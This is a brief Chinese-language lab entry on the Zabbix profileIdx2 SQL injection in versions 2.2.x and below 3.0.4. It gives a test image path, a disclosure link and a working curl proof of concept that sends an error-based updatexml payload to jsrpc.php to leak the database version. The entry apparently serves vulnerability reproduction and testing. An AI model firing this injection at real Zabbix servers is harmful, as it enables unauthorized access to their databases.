### profileIdx2 注入

测试镜像

* src/zabbix/2.2.10/

影响版本

* 2.2.X
* < 3.0.4

参考链接

* [Re: Zabbix 2.2.x, 3.0.x SQL Injection Vulnerability](http://seclists.org/fulldisclosure/2016/Aug/79)

Poc

```
# 请先修正 cookie

curl 'http://127.0.0.1/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471054088083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=updatexml(2,concat(0x7e,(version())),0)&updateProfile=true&screenitemid=&period=3600&stime=20170813040734&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1'
```

